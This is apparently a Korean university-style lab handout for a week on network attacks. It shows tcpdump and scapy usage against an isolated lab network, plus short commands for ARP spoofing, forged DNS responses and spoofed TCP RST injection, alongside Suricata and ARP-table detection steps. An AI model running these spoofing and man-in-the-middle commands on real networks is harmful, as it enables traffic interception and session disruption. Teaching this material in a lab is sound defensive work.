# Week 09 — 네트워크 공격 + 패킷 분석

> 본 주차는 L2-L4 네트워크 공격 — ARP / DNS / TCP/IP + scapy + tcpdump. 6v6 환경에서
> ARP spoofing / DNS poisoning / TCP RST injection 시뮬.

## 학습 목표

1. tcpdump + Wireshark 패킷 분석
2. scapy 의 packet 작성 + 송신
3. ARP spoofing (MITM)
4. DNS poisoning
5. TCP RST injection (conn 종료)
6. ATT&CK Lateral Movement

## 1. tcpdump

```
sudo tcpdump -i eth0 -n -nn                      # 기본
sudo tcpdump -i eth0 "tcp port 80"               # filter
sudo tcpdump -i eth0 -A "tcp port 80"            # ASCII 출력
sudo tcpdump -i eth0 -w capture.pcap             # pcap 파일
sudo tcpdump -i eth0 -X "host 10.20.30.202"      # hex+ASCII
```

BPF filter:
- `host <IP>` / `net <CIDR>`
- `port <N>` / `portrange N-M`
- `proto tcp / udp / icmp`
- `src <IP>` / `dst <IP>`

## 2. scapy

```
from scapy.all import *

# ping
send(IP(dst="10.20.30.1")/ICMP())

# SYN
send(IP(dst="10.20.30.1")/TCP(dport=80, flags="S"))

# spoof source
send(IP(src="1.2.3.4", dst="10.20.30.1")/TCP(dport=80))

# 패킷 캡처
sniff(filter="tcp port 80", count=10, prn=lambda x: x.show())
```

## 3. ARP spoofing

```
# attacker → 모든 호스트에 "10.20.30.1 의 MAC 은 attacker 의 MAC"
arpspoof -i eth0 -t <victim> -r <gateway>
```

MITM 위치 점령 → 트래픽 통제·변조.

## 4. DNS poisoning

```
# /etc/hosts 변조 (단순)
# 또는 DNS 응답 위조 (scapy)
send(IP(dst=<victim>)/UDP(dport=53)/DNS(qr=1, an=DNSRR(rrname="example.com", rdata="attacker_ip")))
```

## 5. TCP RST injection

```
send(IP(src=<spoofed>, dst=<victim>)/TCP(sport=<port>, dport=<port>, flags="R", seq=<seq>))
```

ssh / HTTP 세션을 강제 종료.

## 6. 실습 1~5

### 1 — tcpdump 캡처

```bash
# tcpdump 옵션 분석:
#   -n: name resolution 안 함 (IP/port 그대로)
#   -i eth0: NIC 지정 (ext bridge)
#   -c 10: 10 packet 후 자동 종료
#   timeout 5: 최대 5초 (혹시 packet 없을 때 종료)
ssh 6v6-attacker 'sudo timeout 5 tcpdump -ni eth0 -c 10 2>&1 | head'
# 출력 형식:
#   <timestamp> IP <src>.<sport> > <dst>.<dport>: Flags [S], seq ...
#   Flags: S=SYN, .=ACK, P=PUSH, F=FIN, R=RST
```

### 2 — scapy ping + SYN

```bash
# scapy ICMP ping — IP 와 ICMP layer 결합
#   IP(dst=...): destination IP 만 지정 (src 는 자동)
#   /ICMP(): ICMP echo-request (type 8)
#   send(): packet 송신 + 응답 무시
ssh 6v6-attacker 'sudo scapy -c "send(IP(dst=\"10.20.30.1\")/ICMP())" 2>&1 | head' || true

# scapy TCP SYN scan + 응답 수신
#   sr1: send + receive 1 packet
#   TCP(dport=80, flags="S"): SYN packet (port 80)
#   timeout=2: 2초 안에 응답 없으면 None
#   r.show(): packet 구조 출력
ssh 6v6-attacker 'sudo python3 -c "
from scapy.all import *
r = sr1(IP(dst=\"10.20.30.1\")/TCP(dport=80, flags=\"S\"), timeout=2, verbose=0)
print(r.summary() if r else \"no response\")
" 2>&1 | head'
# 예상 출력:
#   IP / TCP 10.20.30.1:http > <attacker>:xxxx SA / Padding
#   SA = SYN-ACK → port 80 open
```

### 3 — Suricata 의 scan detection

```bash
# Suricata 의 eve.json 에서 최근 alert event 추출
#   grep "alert": event_type=alert 인 line 만
#   본 lab 에서 scan trigger 시 ET SCAN 시리즈 매치 (1:2010937 등)
ssh 6v6-ips 'sudo tail -50 /var/log/suricata/eve.json | grep alert | head'
# 또는 jq 활용
ssh 6v6-ips 'sudo tail -100 /var/log/suricata/eve.json | jq "select(.event_type==\"alert\") | {sig:.alert.signature, src:.src_ip}" 2>/dev/null | head'
```

### 4 — ARP table 조회

```bash
# ip neigh show — 현재 호스트가 알고 있는 (resolved) MAC 매핑
#   각 row = IP / dev / lladdr (MAC) / 상태 (REACHABLE / STALE / DELAY)
ssh 6v6-attacker 'ip neigh show'

# arp -a — legacy 명령, 같은 정보
#   Hostname (IP) at MAC [ether] on eth0
ssh 6v6-attacker 'arp -a 2>&1 | head'
# 운영 측 detection: osquery 의 arp_cache 테이블 + 비정상 entry 알림
```

### 5 — TCP RST 시뮬 (실 lab 환경 영향 적게)

```python
# scapy 로 TCP RST 패킷 작성 — conn 강제 종료
# (학습 환경에서는 실 적용 X — docker bridge 에서 효과 미미)
from scapy.all import IP, TCP, send

# 가짜 RST: 특정 conn 의 src/dst/sport/dport/seq 일치 시 종료
# 실제 conn 의 seq 를 알아내려면 sniff 가 먼저 필요
send(IP(src="10.20.30.202", dst="10.20.30.1")/TCP(sport=12345, dport=80, flags="R", seq=99999))
# 이 packet 이 fw 에 도달해도 진행 중 conn 의 seq 와 다르면 무시됨
```

## 7. ATT&CK

| Tactic | Technique |
|--------|-----------|
| TA0008 Lateral Movement | T1021 Remote Services |
| TA0040 Impact | T1565 Data Manipulation |
| TA0011 C2 | T1090 Proxy |

## 8. 과제

A. tcpdump 캡처 (필수) — 1분 트래픽 분석
B. scapy 스크립트 (심화) — 10 packet 자동 생성
C. ARP / DNS 보안 분석 (정성)

## 9. W10 (IDS/WAF 우회) 예고

본 lab 의 Suricata / ModSec 의 paranoia / threshold 우회 패턴.
